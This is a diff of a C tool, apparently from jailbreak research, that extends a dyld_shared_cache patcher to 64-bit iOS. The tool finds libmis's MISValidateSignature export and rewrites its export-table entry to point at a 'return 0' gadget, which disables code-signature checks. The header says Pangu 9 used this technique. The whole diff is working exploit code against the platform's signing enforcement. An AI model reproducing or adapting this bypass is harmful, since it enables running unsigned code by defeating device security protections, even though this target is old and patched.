@@ -1,8 +1,9 @@
-/* haxx.c - dyld_shared_cache hack
- * copyright (c) 2021/04/12 dora2ios
- * license : MIT
+/* haxx64.c - 64bit dyld_shared_cache hack
+ * This is used in pangu 9 (9.0-9.1), and "fix in 9.2"
+ * copyright (c) 2022/01/11 dora2ios
+ * license : Anyone but do not abuse.
  *
- * build : gcc haxx.c (-DIOS9) -o haxx
+ * build : gcc (-DIOS9) (-DARM64) haxx.c export_stuff/export_stuff.c -Iexport_stuff/ -o haxx
  */
 
 #include <stdint.h>
@@ -13,7 +14,43 @@
 #include <stddef.h>
 #include <mach-o/loader.h>
 #include <mach-o/nlist.h>
+#include "export_stuff/export_stuff.h"
 
+#ifdef ARM64
+static int insn_is_movz_x0_0(uint32_t *i)
+{
+    if (*i == 0xd2800000)
+    {
+        return 1;
+    }
+    return 0;
+}
+
+static int insn_is_movz_x2_0(uint32_t *i)
+{
+    if (*i == 0xd2800002)
+    {
+        return 1;
+    }
+    return 0;
+}
+
+static int insn_is_ret(uint32_t *i)
+{
+    if (*i == 0xd65f03c0)
+        return 1;
+
+    return 0;
+}
+
+static int insn_is_b_64(uint32_t *i)
+{
+    if ((*i & 0xff000000) == 0x17000000)
+        return 1;
+    else
+        return 0;
+}
+#else
 static int insn_is_mov_x0_0_bx_lr(uint32_t *i)
 {
     if (*i == 0x47702000)
@@ -22,6 +59,7 @@ static int insn_is_mov_x0_0_bx_lr(uint32_t *i)
     }
     return 0;
 }
+#endif
 
 int open_file(char *file, size_t *sz, void **buf)
 {
@@ -85,18 +123,23 @@ struct dyld_cache_image_info
     uint32_t pad;
 };
 
-uint64_t exportTableOffset;
-uint64_t MISValidateSignature;
-uint64_t MOV_R0_0__BX_LR;
 #ifdef IOS9
-    int isIOS9=1;
+int isIOS9 = 1;
 #else
-    int isIOS9=0;
+int isIOS9 = 0;
 #endif
 
+#ifdef ARM64
+#define MAGIC MH_MAGIC_64
+#define HEADER mach_header_64
+#define NLIST nlist_64
+#else
+#define MAGIC MH_MAGIC
+#define HEADER mach_header
+#define NLIST nlist
+#endif
 int main(int argc, char **argv)
 {
-
     if (argc != 3)
     {
         printf("%s <in> <out>\n", argv[0]);
@@ -109,6 +152,8 @@ int main(int argc, char **argv)
     void *buf;
     size_t sz;
     open_file(infile, &sz, &buf);
+
+    // offset_init();
 
     struct dyld_cache_header *header = buf;
 
@@ -140,7 +185,6 @@ int main(int argc, char **argv)
     }
     mapInfo = buf + header->mappingOffset;
 
-    // search str: "/System/Library/Caches/com.apple.xpc/sdk.dylib"
     const char *libmis = "/usr/lib/libmis.dylib";
     const char *searchStr8 = "/System/Library/Caches/com.apple.xpc/sdk.dylib";
     const char *searchStr9 = "/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGCorePDF.dylib";
@@ -191,7 +235,7 @@ int main(int argc, char **argv)
     while (1)
     {
         uint32_t value = *(uint32_t *)(buf + imgoffset);
-        if (value == MH_MAGIC)
+        if (value == MAGIC)
         {
             libmisheaderloc = imgoffset;
             break;
@@ -199,32 +243,31 @@ int main(int argc, char **argv)
         imgoffset -= 4;
     }
 
-    printf("LIBMIS HEADER: %08x\n", libmisheaderloc);
+    printf("LIBMIS HEADER: %16llx\n", mapInfo->address + libmisheaderloc);
 
-    struct mach_header *libmisheader = buf + libmisheaderloc;
+    struct HEADER *libmisheader = buf + libmisheaderloc;
     uint32_t offset = 0;
     uint64_t MISValidateSignature;
     uint64_t libmisExportTableOffset;
     uint32_t libmisExportTableSize;
     for (int i = 0; i < libmisheader->ncmds; i++)
     {
-        struct load_command *lc = buf + libmisheaderloc + sizeof(struct mach_header) + offset;
+        struct load_command *lc = buf + libmisheaderloc + sizeof(struct HEADER) + offset;
         if (lc->cmd == LC_SYMTAB)
         {
             struct symtab_command *stc = (struct symtab_command *)lc;
             uint64_t stringtableoffset = (uint64_t)(buf + stc->stroff);
             uint64_t stringtablesize = stc->strsize;
-            uint64_t symtableoffset = (uint64_t) (buf + stc->symoff);
+            uint64_t symtableoffset = (uint64_t)(buf + stc->symoff);
             uint64_t symentries = stc->nsyms;
             for (int i = 0; i < symentries; ++i)
             {
-                struct nlist *nl = (struct nlist *)(symtableoffset + sizeof(struct nlist) * i);
+                struct NLIST *nl = (struct NLIST *)(symtableoffset + sizeof(struct NLIST) * i);
                 if ((nl->n_type & N_TYPE) != N_UNDF)
                 {
                     char *symbol = (char *)(stringtableoffset + nl->n_un.n_strx);
                     if (strcmp(symbol, "_MISValidateSignature") == 0)
                     {
-                        printf("MISVALIDATESIGNATURE %08x\n", nl->n_value);
                         MISValidateSignature = nl->n_value;
                     }
                 }
@@ -240,34 +283,62 @@ int main(int argc, char **argv)
         }
         offset += lc->cmdsize;
     }
-    uint64_t exportTableMVS;
-    if (isIOS9)
-    {
-        exportTableMVS = 0x5E2;
-    }
-    else
-    {
-        exportTableMVS = 0x53A;
-    }
-    uint64_t exportTableOffset = libmisExportTableOffset + exportTableMVS;
-
-    printf("exportTableOffset %08llx\n", exportTableOffset);
-
+    printf("MISVALIDATESIGNATURE %08llx\n", MISValidateSignature);
+    // find mov x0 #0 ret gadget
+    //  0xd2800000 -> 00 00 80 d2
+    //  0xd2800002 -> 02 00 80 D2
     imgoffset = libmisoffset;
     uint64_t MOV_R0_0__BX_LR;
+
     while (1)
     {
         imgoffset++;
+#ifdef ARM64
+        if (insn_is_movz_x0_0(buf + imgoffset))
+        {
+            if (insn_is_ret(buf + imgoffset + 4))
+            {
+                MOV_R0_0__BX_LR = mapInfo->address + imgoffset;
+                break;
+            }
+        }
+#else
         if (insn_is_mov_x0_0_bx_lr(buf + imgoffset))
         {
             MOV_R0_0__BX_LR = mapInfo->address + imgoffset;
             break;
         }
+#endif
     }
 
-    printf("MOV R0, #0 BX LR %08llx\n", MOV_R0_0__BX_LR);
+    printf("MOV X0, #0 RET GADGET %08llx\n", MOV_R0_0__BX_LR);
 
+    /**void *exportTableBuffer = malloc(libmisExportTableSize);
+    memset(exportTableBuffer, '\0', libmisExportTableSize);
+    memcpy(exportTableBuffer, buf + libmisExportTableOffset, libmisExportTableSize);**/
+
+    uint16_t mvsdataaddressoffset;
+    findInExportTable(buf + libmisExportTableOffset, buf + libmisExportTableOffset, "", &mvsdataaddressoffset);
+    printf("da real offset %x\n", mvsdataaddressoffset);
+    uint64_t exportTableOffset = libmisExportTableOffset + mvsdataaddressoffset;
+    printf("exportTableOffset %08llx\n", exportTableOffset);
+
+    uint64_t toreplace = MOV_R0_0__BX_LR - (mapInfo->address + libmisheaderloc);
+    printf("NEW VALUE :");
+    uint8_t newval[2] = {};
+    EncodeUleb128(toreplace, newval);
+    for (int i = 0; i < 2; ++i)
+    {
+        printf("%02x", *(newval + i));
+    }
+    printf("\n");
+
+    // 16k?
+    #ifdef ARM64
+    uint64_t pad = 0x4000;
+    #else
     uint64_t pad = 0x2000;
+    #endif
     uint64_t dataSize = 0x4000;
 
     uint64_t baseAddr = mapInfo->address;
@@ -287,12 +358,17 @@ int main(int argc, char **argv)
     memcpy(newBuf, buf, sz);
 
     /* copy fakeheader */
-    uint64_t newHeaderOffset = ((sz & ~0xfff) + pad);
+    #ifdef ARM64
+    #define MASK 0x3fff
+    #else
+    #define MASK 0xfff
+    #endif
+    uint64_t newHeaderOffset = ((sz & ~MASK) + pad);
     printf("[memcpy] header [sz: %016llx] : %016llx -> %016llx\n", headerSize, (uint64_t)0, newHeaderOffset);
     memcpy(newBuf + newHeaderOffset, buf, headerSize);
 
     /* copy fakedata */
-    uint64_t dataOffset = (exportTableOffset & ~0xfff);
+    uint64_t dataOffset = (exportTableOffset & ~MASK);
     uint64_t newDataOffset = ((sz & ~0xfff) + pad + headerSize);
     printf("[memcpy] data   [sz: %016llx] : %016llx -> %016llx\n", dataSize, dataOffset, newDataOffset);
     memcpy(newBuf + newDataOffset, buf + dataOffset, dataSize);
@@ -480,49 +556,17 @@ int main(int argc, char **argv)
 
     // 7, change export table
     uint16_t origTable = *(uint16_t *)(buf + exportTableOffset);
-    // printf("origTable: %04x\n", origTable);
+    printf("origTable: %04x\n", origTable);
 
     uint64_t patch_point = (exportTableOffset - ((mapInfo + 2)->fileOffset + tableBaseSize) + newDataOffset);
     printf("original_point : %016llx\n", exportTableOffset);
     printf("patch_point    : %016llx\n", patch_point);
 
-    uint16_t newTable;
-    if (MISValidateSignature > MOV_R0_0__BX_LR)
-    {
-        uint64_t a = MISValidateSignature - MOV_R0_0__BX_LR;
-        printf("a: %016llx\n", a);
-
-        int i = 0;
-        while (a > 0x80)
-        {
-            i++;
-            a -= 0x80;
-        }
-        printf("i: %x\n", i);
-
-        newTable = origTable - a - i * 0x100;
-    }
-    else
-    {
-        uint64_t a = MOV_R0_0__BX_LR - MISValidateSignature;
-        printf("a: %016llx\n", a);
-
-        int i = 0;
-        while (a > 0x80)
-        {
-            i++;
-            a -= 0x80;
-        }
-        printf("i: %x\n", i);
-
-        newTable = origTable + a + i * 0x100;
-    }
-    printf("%016llx: %04x -> %04x\n", patch_point, __builtin_bswap16(origTable), __builtin_bswap16(newTable));
-
-    *(uint16_t *)(newBuf + patch_point) = newTable;
+    *(uint8_t *)(newBuf + patch_point) = newval[0];
+    *(uint8_t *)(newBuf + patch_point + 1) = newval[1];
     printf("\n");
-    /* end */
 
+    /* end */
     printf("write: %s\n", outfile);
     FILE *out = fopen(outfile, "w");
     if (!out)
